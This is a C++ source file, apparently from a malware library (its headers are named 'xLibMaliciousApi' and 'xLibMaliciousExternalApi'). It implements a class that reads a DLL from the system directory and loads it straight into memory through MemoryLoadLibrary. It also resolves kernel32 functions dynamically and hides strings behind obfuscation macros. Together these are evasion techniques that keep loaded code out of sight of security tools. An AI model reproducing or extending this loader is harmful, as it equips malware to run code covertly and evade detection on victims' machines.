#include "xMemoryModule.h"

#include "MemoryModule.h"

#include "xLibMaliciousApi.h"
#include "xLibMaliciousExternalApi.h"
#include "xOsApi.h"



xMemoryModule::xMemoryModule()
{
}

xMemoryModule::xMemoryModule(const wchar_t* fileName)
{
	Load(fileName);
}

xMemoryModule::xMemoryModule(const void* buffer, const size_t size)
{
	Load(buffer, size);
}

xMemoryModule::xMemoryModule(HMEMORYMODULE module) : m_module(module)
{
}

xMemoryModule::~xMemoryModule()
{
	Free();
}

bool xMemoryModule::Load(const wchar_t* fileName)
{
	bool result = false;

	if (fileName)
	{
		wchar_t path[_MAX_PATH] = {0};

		if (X_KERNEL32_DYNAMIC_MODULE_CALL(GetSystemDirectory)(path, sizeof(path) / sizeof(wchar_t)))
		{
			wchar_t* temp = xStringAppend(path, X_OBFUSCATED_STRING_W(L"\\"));

			if (temp)
			{
				wchar_t* toLoad = xStringAppend(temp, fileName);

				if (toLoad)
				{
					HANDLE file = X_KERNEL32_DYNAMIC_MODULE_CALL(CreateFile)(toLoad, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

					if (file)
					{
						LARGE_INTEGER size;

						xMemoryZero(&size, sizeof(size));

						if (GetFileSizeEx(file, &size))
						{
							void* buffer = xMemoryAlloc((size_t) size.QuadPart);

							if (buffer)
							{
								if (ReadFile(file, buffer, (DWORD) size.QuadPart, NULL, NULL))
								{
									result = Load(buffer, (size_t) size.QuadPart);
								}

								xMemoryFree(buffer);
							}
						}

						CloseHandle(file);
					}

					xMemoryFree(toLoad);
				}
			
				xMemoryFree(temp);
			}
		}
	}

	return result;
}

bool xMemoryModule::Load(const void* buffer, const size_t size)
{
	bool result = false;

	if (buffer && size)
	{
		Free();

		result = !!(m_module = X_LIB_MALICIOUS_EXTERNAL_CALL(MemoryLoadLibrary)(buffer, size));
	}

	return result;
}

void xMemoryModule::Free()
{
	if (m_module)
	{
		X_LIB_MALICIOUS_EXTERNAL_CALL(MemoryFreeLibrary)(m_module);

		m_module = NULL;
	}
}

HMEMORYMODULE xMemoryModule::GetModule()
{
	return m_module;
}

void* xMemoryModule::GetFunction(const char* name)
{
	return X_LIB_MALICIOUS_EXTERNAL_CALL(MemoryGetProcAddress)(GetModule(), name);
}

LPVOID xMemoryModuleDefaultAlloc(LPVOID address, SIZE_T size, DWORD allocationType, DWORD protect, void* context)
{
	return X_KERNEL32_CALL(VirtualAlloc)(address, size, allocationType, protect);
}

BOOL xMemoryModuleDefaultFree(LPVOID address, SIZE_T size, DWORD freeType, void* context)
{
	return X_KERNEL32_CALL(VirtualFree)(address, size, freeType);
}

FARPROC xMemoryModuleDefaultGetProcAddress(HCUSTOMMODULE module, LPCSTR name, void* context)
{
	return (FARPROC) X_LIB_MALICIOUS_CALL(xOsReplacementApiGetProcAddress)(module, name);
}